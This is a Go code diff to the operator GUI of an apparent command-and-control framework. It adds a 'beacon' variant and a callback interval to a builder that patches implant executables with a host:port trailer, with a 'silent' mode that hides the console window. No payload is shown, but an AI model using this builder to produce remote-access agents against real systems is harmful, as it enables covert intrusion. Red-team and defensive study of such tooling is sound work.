@@ -9,6 +9,7 @@ import (
 	"io"
 	"net/http"
 	"os"
+	"strconv"
 	"strings"
 	"time"
 
@@ -271,11 +272,28 @@ func (a *App) StopRelay(id uint64, relayID string) error {
 
 // ---- Stub builder ----
 
-// BuildStub patches a base implant exe with a host:port trailer and returns
-// the patched bytes as base64 (the frontend triggers a blob download). When
-// silent is true the GUI-subsystem base exe is used (no console window).
-func (a *App) BuildStub(host, port string, silent bool) (string, error) {
-	body := map[string]any{"host": host, "port": port, "silent": silent}
+// sleepToInterval converts a Sleep Time (seconds) from the GUI into the decimal
+// trailer interval the core appends for a beacon. <=0 means "omit" (the beacon
+// falls back to its default interval); a sane upper bound keeps the trailer
+// short and guards against fat-fingered huge values.
+func sleepToInterval(sleep int) string {
+	if sleep <= 0 {
+		return ""
+	}
+	if sleep > 3600 {
+		sleep = 3600
+	}
+	return strconv.Itoa(sleep)
+}
+
+// BuildStub patches a base implant/beacon exe with a host:port trailer and
+// returns the patched bytes as base64 (the frontend triggers a blob download).
+// silent is true the GUI-subsystem base exe is used (no console window). beacon
+// selects the beacon base exe (auto-reconnecting agent); sleep (seconds, >0)
+// is baked into the trailer as the beacon's callback interval (ignored for the
+// stock implant).
+func (a *App) BuildStub(host, port string, silent, beacon bool, sleep int) (string, error) {
+	body := map[string]any{"host": host, "port": port, "silent": silent, "beacon": beacon, "interval": sleepToInterval(sleep)}
 	var resp struct {
 		ExeB64 string `json:"exe_b64"`
 	}
@@ -285,14 +303,16 @@ func (a *App) BuildStub(host, port string, silent bool) (string, error) {
 	return resp.ExeB64, nil
 }
 
-// BuildStubToProject patches a base implant exe via the core (/api/stub/build,
-// which only returns base64 — no project-local copy), then pops the OS
-// "Save As" dialog so the operator chooses where to save the agent exe.
-// Returns the chosen absolute path (JSON string {"path":""}) — path is empty
-// if the operator cancelled. name suggests a default filename in the dialog.
-// silent selects the GUI-subsystem base exe (no console window on launch).
-func (a *App) BuildStubToProject(host, port, name string, silent bool) (string, error) {
-	body := map[string]any{"host": host, "port": port, "silent": silent}
+// BuildStubToProject patches a base implant/beacon exe via the core
+// (/api/stub/build, which only returns base64 — no project-local copy), then
+// pops the OS "Save As" dialog so the operator chooses where to save the agent
+// exe. Returns the chosen absolute path (JSON string {"path":""}) — path is
+// empty if the operator cancelled. name suggests a default filename in the
+// dialog. silent selects the GUI-subsystem base exe (no console window on
+// launch). beacon selects the beacon base exe; sleep (seconds, >0) is baked
+// into the trailer as the beacon callback interval.
+func (a *App) BuildStubToProject(host, port, name string, silent, beacon bool, sleep int) (string, error) {
+	body := map[string]any{"host": host, "port": port, "silent": silent, "beacon": beacon, "interval": sleepToInterval(sleep)}
 	var resp struct {
 		ExeB64 string `json:"exe_b64"`
 	}
@@ -302,10 +322,14 @@ func (a *App) BuildStubToProject(host, port, name string, silent bool) (string, 
 	if resp.ExeB64 == "" {
 		return "", fmt.Errorf("no exe in core response")
 	}
-	// OS Save As dialog. Default to <name>.exe (or ruststrike-implant.exe).
+	// OS Save As dialog. Default to <name>.exe (variant-aware fallback).
 	defName := strings.TrimSpace(name)
 	if defName == "" {
-		defName = "ruststrike-implant"
+		if beacon {
+			defName = "ruststrike-beacon"
+		} else {
+			defName = "ruststrike-implant"
+		}
 	}
 	if !strings.HasSuffix(strings.ToLower(defName), ".exe") {
 		defName += ".exe"
